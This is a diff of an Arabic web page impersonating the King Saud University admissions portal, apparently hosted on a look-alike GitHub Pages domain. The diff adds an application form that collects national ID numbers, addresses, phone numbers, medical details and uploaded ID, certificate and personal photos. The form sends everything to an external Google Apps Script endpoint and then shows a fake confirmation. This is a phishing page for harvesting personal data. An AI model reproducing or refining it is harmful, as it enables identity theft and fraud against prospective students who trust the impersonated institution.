@@ -5,193 +5,80 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>بوابة القبول والتسجيل - جامعة الملك سعود</title>
 
-<!-- روابط CSS والخطوط -->
-<link rel="stylesheet" href="style.css">
-<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
 
-<!-- Meta Tags للعرض عند مشاركة الرابط -->
-<meta property="og:title" content="بوابة القبول والتسجيل - جامعة الملك سعود">
-<meta property="og:description" content="مرحباً بكم في البوابة الرسمية للقبول والتسجيل بجامعة الملك سعود. تابع حالة قبولك، قدم طلبك للبرامج الأكاديمية، وأتمم إجراءات التسجيل بسهولة وأمان.".   .">
-<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRTALa4mhKcalStHp1k_JpUksDCrYJySsZGcO3qOr5IYh5SXmMhFEt4a0v&s=10">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://pnu-admissions.github.io/.ksu.edu.sa/?v=2">
-
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="بوابة القبول والتسجيل - جامعة الملك سعود">
-<meta name="twitter:description" content="مرحباً بكم في البوابة الرسمية للقبول والتسجيل بجامعة الملك سعود. تابع حالة قبولك، قدم طلبك للبرامج الأكاديمية، وأتمم إجراءات التسجيل بسهولة وأمان." ،.">
-<meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTRTALa4mhKcalStHp1k_JpUksDCrYJySsZGcO3qOr5IYh5SXmMhFEt4a0v&s=10">
+<style>
+body{font-family:'Tajawal',sans-serif; background:#f8f8f8; margin:0; padding:0;}
+.container{max-width:900px;margin:20px auto;padding:20px;background:#fff;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.1);}
+h2,h3{color:#0b6b44;}
+.form-group{margin-bottom:12px;}
+label{display:block;margin-bottom:4px;font-weight:600;}
+input,select,textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;}
+textarea{resize:vertical;}
+button.submit-btn{background:#0b6b44;color:#fff;padding:12px 20px;border:none;border-radius:8px;cursor:pointer;}
+button.submit-btn:hover{background:#095632;}
+.hidden{display:none;}
+.success-message{margin-top:15px;padding:12px;background:#d4edda;color:#155724;border-radius:6px;}
+</style>
 
 </head>
 <body>
 
-<header>
-    <div class="container">
-        <div class="logo">
-            <img src="logo.png" alt="شعار جامعة الملك سعود">
-            <div class="logo-text">
-                <h1>جامعة الملك سعود</h1>
-                <p>بوابة القبول والتسجيل</p>
-            </div>
-        </div>
-        <nav>
-            <ul>
-                <li><a href="#home">الرئيسية</a></li>
-                <li><a href="#services">الخدمات</a></li>
-                <li><a href="#contact">اتصل بنا</a></li>
-            </ul>
-        </nav>
-    </div>
-</header>
-
-<div id="home"></div>
-
-<section id="hero" class="hero-section">
-    <div class="container">
-        <h2>مرحباً بك في بوابة القبول والتسجيل</h2>
-        <p>جامعة الملك سعود - نحو مستقبل أكاديمي مشرق</p>
-    </div>
-</section>
-
-<section id="services" class="services-section">
 <div class="container">
-<h2 class="text-center">خدمات القبول والتسجيل</h2>
-<div class="service-cards">
+<h2>نموذج تقديم طلب جديد - جامعة الملك سعود</h2>
+<form id="applicationForm" enctype="multipart/form-data" method="POST" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec">
 
-    <div id="inquiry-card" class="service-card">
-        <div class="icon"><i class="fas fa-search"></i></div>
-        <h3>الاستعلام عن القبول</h3>
-        <p>استعلم عن حالة قبولك في الجامعة باستخدام رقم الهوية ورقم الجوال</p>
-        <button class="submit-btn" onclick="showInquiryForm()">استعلام</button>
-    </div>
+<h3>البيانات الشخصية</h3>
+<div class="form-group"><label>الاسم الكامل *</label><input type="text" name="fullName" required></div>
+<div class="form-group"><label>الجنس *</label><select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select></div>
+<div class="form-group"><label>الجنسية *</label><input type="text" name="nationality" required></div>
+<div class="form-group"><label>الدولة (مكان الإقامة) *</label><input type="text" name="country" required></div>
+<div class="form-group"><label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required></div>
+<div class="form-group"><label>تاريخ الميلاد *</label><input type="date" name="dob" required></div>
+<div class="form-group"><label>مكان الميلاد (المدينة)</label><input type="text" name="birthPlace"></div>
+<div class="form-group"><label>المدينة *</label><input type="text" name="city" required></div>
+<div class="form-group"><label>العنوان *</label><textarea name="address" required></textarea></div>
+<div class="form-group"><label>رقم الجوال (واتساب) *</label><input type="tel" name="phone" required></div>
+<div class="form-group"><label>البريد الإلكتروني *</label><input type="email" name="email" required></div>
 
-    <div id="application-card" class="service-card">
-        <div class="icon"><i class="fas fa-user-plus"></i></div>
-        <h3>تقديم طلب جديد</h3>
-        <p>املأ النموذج بالكامل لتقديم طلبك للجامعة</p>
-        <button class="submit-btn" onclick="showApplicationForm()">تقديم طلب جديد</button>
-    </div>
+<h3>المؤهل السابق والبرنامج</h3>
+<div class="form-group"><label>نوع المؤهل السابق *</label><select name="prevDegree" required><option value="">اختر...</option><option>ثانوي</option><option>دبلوم</option><option>بكالوريوس</option><option>ماجستير</option></select></div>
+<div class="form-group"><label>سنة التخرج *</label><input type="number" name="gradYear" required></div>
+<div class="form-group"><label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute"></div>
+<div class="form-group"><label>النسبة / المعدل</label><input type="text" name="gpa"></div>
+<div class="form-group"><label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required></div>
+<div class="form-group"><label>نوع الدراسة *</label><select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select></div>
+<div class="form-group"><label>الكلية / القسم *</label><input type="text" name="faculty" required></div>
+<div class="form-group"><label>هل لديك أي حالة طبية هامة؟</label><input type="text" name="medicalInfo"></div>
 
-    <div id="payment-card" class="service-card">
-        <div class="icon"><i class="fas fa-credit-card"></i></div>
-        <h3>سداد الرسوم</h3>
-        <p>ادفع رسوم التسجيل والدراسة بطريقة آمنة ومريحة</p>
-        <button class="submit-btn" onclick="alert('يرجى البدء بالاستعلام عن القبول أولاً')">سداد</button>
-    </div>
+<h3>جهة الاتصال في حالات الطوارئ</h3>
+<div class="form-group"><label>اسم جهة الاتصال للطوارئ</label><input type="text" name="emergencyName"></div>
+<div class="form-group"><label>صلة القرابة</label><input type="text" name="emergencyRelation"></div>
+<div class="form-group"><label>رقم الطوارئ</label><input type="tel" name="emergencyPhone"></div>
 
-    <div id="confirmation-card" class="service-card">
-        <div class="icon"><i class="fas fa-check-circle"></i></div>
-        <h3>تأكيد القبول</h3>
-        <p>أكد قبولك في الجامعة وابدأ رحلتك الأكاديمية معنا</p>
-        <button class="submit-btn" onclick="alert('يرجى البدء بالاستعلام عن القبول أولاً')">تأكيد</button>
-    </div>
+<h3>الملفات المرفقة</h3>
+<div class="form-group"><label>صورة الهوية / الإقامة *</label><input type="file" name="fileId" accept="image/*,application/pdf" required></div>
+<div class="form-group"><label>صورة الشهادة / المؤهل *</label><input type="file" name="fileCertificate" accept="image/*,application/pdf" required></div>
+<div class="form-group"><label>صورة شخصية *</label><input type="file" name="filePhoto" accept="image/*" required></div>
 
+<div class="form-group"><label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة ومطابقة للوثائق الرسمية.</label></div>
+
+<button type="submit" class="submit-btn">إرسال الطلب</button>
+</form>
+
+<div id="successMessage" class="success-message hidden">
+تم استلام جميع بياناتك بنجاح. سيتم التواصل معك عبر الرابط الخاص بك.
 </div>
 </div>
-</section>
 
-<section id="forms-section" class="forms-section hidden">
-    <div class="container">
+<script>
+document.getElementById('applicationForm').addEventListener('submit', function(e){
+    setTimeout(function(){
+        document.getElementById('successMessage').classList.remove('hidden');
+    }, 500);
+});
+</script>
 
-        <!-- نموذج الاستعلام -->
-        <div id="inquiry-form" class="form-container hidden">
-            <h3>الاستعلام عن القبول</h3>
-            <form onsubmit="event.preventDefault(); checkAdmission();">
-                <div class="form-group">
-                    <label>رقم الهوية</label>
-                    <input type="text" id="inquiry-id" placeholder="أدخل رقم الهوية" required>
-                </div>
-                <div class="form-group">
-                    <label>رقم الجوال</label>
-                    <input type="text" id="inquiry-phone" placeholder="أدخل رقم الجوال" required>
-                </div>
-                <button type="submit" class="submit-btn">استعلام</button>
-            </form>
-        </div>
-
-        <!-- نموذج التقديم -->
-        <div id="application-form" class="form-container hidden">
-            <h3>نموذج تقديم طلب جديد</h3>
-            <form id="applicationForm" enctype="multipart/form-data">
-
-                <div class="form-group">
-                    <label>الاسم الكامل</label>
-                    <input type="text" name="fullName" placeholder="أدخل الاسم الكامل" required>
-                </div>
-
-                <div class="form-group">
-                    <label>رقم الهوية / الإقامة</label>
-                    <input type="text" name="idNumber" placeholder="أدخل رقم الهوية أو الإقامة" required>
-                </div>
-
-                <div class="form-group">
-                    <label>تاريخ الميلاد</label>
-                    <input type="date" name="dob" required>
-                </div>
-
-                <div class="form-group">
-                    <label>البريد الإلكتروني</label>
-                    <input type="email" name="email" placeholder="example@mail.com" required>
-                </div>
-
-                <div class="form-group">
-                    <label>رقم الجوال</label>
-                    <input type="text" name="phone" placeholder="أدخل رقم الجوال" required>
-                </div>
-
-                <div class="form-group">
-                    <label>البرنامج الدراسي المطلوب</label>
-                    <select name="program" required>
-                        <option value="">اختر البرنامج</option>
-                        <option>البكالوريوس</option>
-                        <option>الماجستير</option>
-                        <option>الدكتوراه</option>
-                        <option>الدبلوم العالي</option>
-                        <option>التعليم عن بعد</option>
-                    </select>
-                </div>
-
-                <div class="form-group">
-                    <label>التخصص المطلوب</label>
-                    <input type="text" name="major" placeholder="أدخل التخصص المطلوب" required>
-                </div>
-
-                <div class="form-group">
-                    <label>المعدل النهائي</label>
-                    <input type="text" name="gpa" placeholder="أدخل المعدل النهائي" required>
-                </div>
-
-                <div class="form-group">
-                    <label>رفع صورة الشهادة</label>
-                    <input type="file" name="certificateFile" accept=".jpg,.jpeg,.png,.pdf" required>
-                </div>
-
-                <div class="form-group">
-                    <label>رفع صورة الهوية</label>
-                    <input type="file" name="idFile" accept=".jpg,.jpeg,.png,.pdf" required>
-                </div>
-
-                <button type="submit" class="submit-btn" onclick="submitApplication()">إرسال الطلب</button>
-            </form>
-
-            <div id="successMessage" class="hidden" style="margin-top:15px; padding:10px; background:#d4edda; color:#155724; border-radius:5px;">
-                تم استلام جميع بياناتك بنجاح. سيتم التواصل معك عبر الرابط الخاص بك.
-            </div>
-        </div>
-
-    </div>
-</section>
-
-<section id="results-section" class="results-section hidden">
-    <div class="container"></div>
-</section>
-
-<footer>
-    <div class="container">
-        <p>&copy; 2025 جامعة الملك سعود - جميع الحقوق محفوظة</p>
-    </div>
-</footer>
-
-<script src="script.js"></script>
 </body>
-</html>
+                        </html>
